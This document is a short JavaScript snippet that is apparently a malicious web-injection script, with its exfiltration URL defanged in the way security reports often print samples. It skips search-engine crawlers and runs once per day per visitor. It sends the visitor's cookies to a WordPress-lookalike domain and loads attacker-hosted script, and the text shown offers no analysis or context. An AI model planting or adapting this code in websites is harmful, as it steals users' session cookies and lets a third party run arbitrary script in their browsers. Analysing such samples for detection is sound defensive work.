function adsadsgg() {
	var gd = document.cookie.indexOf("_utmzz=");
	if (gd == -1 && (/Applebot|baiduspider|Bingbot|Googlebot|ia_archiver|msnbot|Naverbot|seznambot|Slurp|teoma|Yandex|Yeti/i.test(navigator.userAgent) == false)) {
    	var rd = Math.floor(Math.random() * 2);
    	if (rd == 0) {
        	var sss = document.createElement('script');
        	sss.src = "hxxps://code.wordprssapi[.]com/ajax/json.aspx?c=" + escape(document.cookie);
        	document.body.appendChild(sss)
	}
    	var dd = new Date();
    	dd.setTime(dd.getTime() + 86400000);
    	window.document.cookie = "_utmzz=ga; expires=" + dd.toGMTString()
	}
}
if (typeof(jQuery) != 'undefined') {
	jQuery(function() {
    	adsadsgg()
	})
} else {
	window.onload = function() {
    	adsadsgg()
	}
}
